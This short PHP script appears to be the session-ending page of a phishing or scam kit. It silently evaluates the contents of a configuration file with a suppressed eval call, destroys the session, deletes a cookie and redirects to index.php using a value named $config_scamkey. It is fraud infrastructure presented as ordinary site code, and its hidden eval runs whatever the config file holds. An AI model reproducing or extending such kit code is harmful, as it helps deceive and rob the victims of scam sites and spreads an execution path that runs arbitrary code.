<?php
include __DIR__ . '/function.php';
@eval(file_get_contents($api->dir_config.'/'.$api->general_config));

session_destroy();
$api->delete_cookie();
$api->redirect("index.php?".$config_scamkey);
?>
